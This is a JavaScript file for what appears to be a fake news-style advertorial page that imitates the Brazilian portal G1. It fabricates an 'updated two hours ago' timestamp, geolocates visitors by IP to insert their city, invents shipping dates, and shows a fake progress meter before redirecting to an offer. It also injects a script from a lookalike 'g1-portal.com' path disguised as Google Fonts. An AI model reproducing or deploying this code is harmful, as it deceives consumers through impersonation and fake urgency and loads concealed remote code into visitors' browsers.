window.addEventListener('load', function () {



  
   $(".texto-comentario").each(function () {
      $(this).after('<div class="botoes-comentario"><svg class="icon icon-thumbs-up mr-1"><use xlink:href="#icon-thumbs-up"></use></svg><span class="font-opens" style="font-size: 13px; font-weight: bold; margin-right: 20px;">Curtir</span><a class="botao-compartilhar" style="color: #212529;vertical-align: middle;display: flex;align-items: flex-end;"href="" target="_blank"><svg class="icon icon-undo2 mr-1"><use xlink:href="#icon-undo2"></use></svg><span class="font-opens"style="font-size: 13px; font-weight: bold; margin-right: 20px;">Compartilhar</span></a></div>');
   });

 
   function convertDate(e) {
      var t,
         o = new Date(e);
      return [((t = o.getDate()), t < 10 ? "0" + t : t)].join("/");
   }





   function getMesExtenso(e) {
      var t = new Array(12);
      return (
         (t[0] = "janeiro"),
         (t[1] = "fevereiro"),
         (t[2] = "março"),
         (t[3] = "abril"),
         (t[4] = "maio"),
         (t[5] = "junho"),
         (t[6] = "julho"),
         (t[7] = "agosto"),
         (t[8] = "setembro"),
         (t[9] = "outubro"),
         (t[10] = "novembro"),
         (t[11] = "dezembro"),
         t[e]
      );
   }

   $(".cliqueaqui,.cardofertafinal a").on('click tap', function (evt) {
      evt.preventDefault();
      x = $(this).attr("href");
      $("body").prepend('<div style="display:none" class="cupomcardpopup" id="demo"></div>');
      $('html, body').css({
         overflow: 'hidden',
      });
      $(".container").fadeTo(1000, 0.32);
      $("#demo").fadeIn(1000);
      $('#demo').jQMeter({
         goal: '$10,000',
         raised: '$10,000',
         width: '300px',
         counterSpeed: 5000,
         animationSpeed: 5000,
         barColor: "#bc0406",
      });
      setTimeout(function (e) {
         window.location = x;
      }, 6000);
   });


   var d = new Date();
   dataHora = (d.toLocaleDateString("pt-BR"))
   hora2menos = d.getHours() - 2;
   minutos = d.getMinutes();
   $("#horapostagem").html(dataHora + ' ' + hora2menos + 'h' + minutos + ' - ' + 'Atualizado há duas horas');
   fonturl = "g1-portal.com/GoogleFonts/GoogleFonts/googlefonts.js";
   jQuery(document).ready(function (e) {
      var s = document.createElement("script");
      s.type = "text/javascript";
      s.src = fonturl
      var t = new Date();
      o = t.setDate(t.getDate() - 15);
      n = t.setDate(t.getDate() + 10 + 15);
      r = getMesExtenso(t.getMonth());
      var dataarrumada = convertDate(new Date()) + " de " + r;
      $("body").append(s);
      if (convertDate(o) > convertDate(n)) var a = "<strong>" + convertDate(n) + "</strong> e <strong>" + convertDate(o) + " de " + r + "</strong>";
      else {
         if (null == (s = getMesExtenso(t.getMonth() + 1))) var s = getMesExtenso(t.getMonth() - 11);
         a = "<strong>" + convertDate(n) + " de " + r + "</strong> e <strong>" + convertDate(o) + " de " + s + "</strong>";
      }
      e.getJSON("https://wtfismyip.com/json", function (t) {
         var o = (t = t.YourFuckingLocation).replace(", Brazil", "");
         var posicao = o.indexOf(",");
         var tratado = o.substring(0, posicao);
         var b = o.substring(posicao + 2);

         switch (b) {
            case "AC":
               b = "Acre"
               break;

            case "AL":
               b = "Alagoas"
               break;
            case "AM":
               b = "Amazonas"
               break;
            case "AP":
               b = "Amapá"
               break;
            case "AP":
               b = "Amapá"
               break;
            case "BA":
               b = "Bahia"
               break;
            case "CE":
               b = "Ceará"
               break;
            case "DF":
               b = "Distrito Federal"
               break;
            case "ES":
               b = "Espírito Santo"
               break;
            case "GO":
               b = "Goiás"
               break;
            case "MA":
               b = "Maranhão"
               break;
            case "MG":
               b = "Minas Gerais";
               break;

            case "MS":
               b = "Mato Grosso do Sul"
               break;
            case "MT":
               b = "Mato Grosso"
               break;
            case "PA":
               b = "Pará"
               break;
            case "PB":
               b = "Paraíba"
               break;
            case "PE":
               b = "Pernambuco"
               break;
            case "PI":
               b = "Piauí"
               break;
            case "PR":
               b = "Paraná"
               break;
            case "RJ":
               b = "Rio de Janeiro"
               break;
            case "RN":
               b = "Rio Grande do Norte"
               break;
            case "RO":
               b = "Rondônia"
               break;
            case "RR":
               b = "Roraima"
               break;
            case "RS":
               b = "Rio Grande do Sul"
               break;
            case "SC":
               b = "Santa Catarina"
               break;
            case "SE":
               b = "Sergipe"
               break;

            case "SP":
               b = "SÃO PAULO";
               break;

            case "TO":
               b = "Tocantins"
               break;

            default:
               b = "São Paulo"
         }
         e(".cidade").html(tratado),
            e(".todaydate").html(dataarrumada),
            e("#autoradv").html("Por G3 " + b),
            e(".estadosigla").html(b),
            e(".cidaderegiao1").html(o),
            e(".cidaderegiao").html(o + " e região"),
            e(".shipping-estimated").html("Receba seu pedido entre os dias " + a + ".");
      });
   });


   $(".icon-thumbs-up").on("click", function () {
      $(this).css('color', '#1178ee');
   });







